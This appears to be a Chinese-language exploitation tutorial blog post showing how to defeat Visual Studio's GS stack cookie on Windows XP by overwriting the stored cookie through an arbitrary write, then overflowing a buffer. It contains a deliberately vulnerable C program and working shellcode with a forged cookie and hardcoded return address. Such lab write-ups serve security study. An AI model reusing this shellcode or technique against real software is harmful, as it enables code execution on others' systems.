---
layout:		post
title:		攻击异常处理突破GS
author:		wooy0ung
tags:		
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

新建一个工程, 贴入以下代码

```
#include <string.h>
#include <stdlib.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90";

void test(char *s, int i, char *src)
{
	char dest[200];
	if(i<0x9995)
	{
		char *buf=s+i;
		*buf+*src;
		*(buf+1)=*(src+1);
		*(buf+2)=*(src+2);
		*(buf+3)=*(src+3);
		strcpy(dest, src);
		__asm int 3
	}
}

int main()
{
	char *str=(char *)malloc(0x10000);
	test(str,0,shellcode);
}
```

项目->属性, 选择release版本, 禁用优化


### 0x01 分析

运行*.exe, OllyDbg自动附加调试

![](/assets/img/exploit/2017-10-03-gsbreak-edit-data/0x00.png)

单步跟进test函数

![](/assets/img/exploit/2017-10-03-gsbreak-edit-data/0x01.png)

可以看到程序从0x00403000取出Security Cookie, 与ebp异或后放到ebp-4

![](/assets/img/exploit/2017-10-03-gsbreak-edit-data/0x02.png)

继续单步到这里, 程序从ebp-4取出Security Cookie, 与ebp异或后, 调用Cookie Check

![](/assets/img/exploit/2017-10-03-gsbreak-edit-data/0x03.png)

再看看源码, test函数的if条件内可以有4 byte的任意写

12288   65608
### 0x02 exploit

再次附加调试, 断在main入口处, 可以看到返回分配堆块的地址0x00410048

![](/assets/img/exploit/2017-10-03-gsbreak-edit-data/0x04.png)

当参数i<0, if条件执行, *buf可以指向低位地址0x00403000, 0x00403000-0x00410048=-53320=0xffff2fb8

![](/assets/img/exploit/2017-10-03-gsbreak-edit-data/0x05.png)

再看看copy数据的起始栈地址0x0012fe94, 返回地址0x0012ff68, ebp=0x0012ff64

![](/assets/img/exploit/2017-10-03-gsbreak-edit-data/0x06.png)
![](/assets/img/exploit/2017-10-03-gsbreak-edit-data/0x07.png)

```
#include <string.h>
#include <stdlib.h>

char shellcode[]=
"\x90\x90\x90\x90"		# ./data Security Cookie
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90"
"\xf4\x6f\x82\x90"		# 0x90909090 xor ebp
"\x90\x90\x90\x90"
"\x94\xfe\x12\x00";		# shellcode入口地址

void test(char *s, int i, char *src)
{
	char dest[200];
	if(i<0x9995)
	{
		char *buf=s+i;
		*buf=*src;
		*(buf+1)=*(src+1);
		*(buf+2)=*(src+2);
		*(buf+3)=*(src+3);
		strcpy(dest, src);
	}
}

int main()
{
	char *str=(char *)malloc(0x10000);
	//__asm int 3
	test(str,0xffff2fb8,shellcode);

	return 0;
}
```

将源码如上修改, 构造216 byte的shellcode, 1~4 byte填充"\x90\x90\x90\x90"写入.data, 
205~208 byte填充"\xf4\x6f\x82\x90", 213~216覆盖为shellcode的入口地址, pwn~

![](/assets/img/exploit/2017-10-03-gsbreak-edit-data/0x08.png)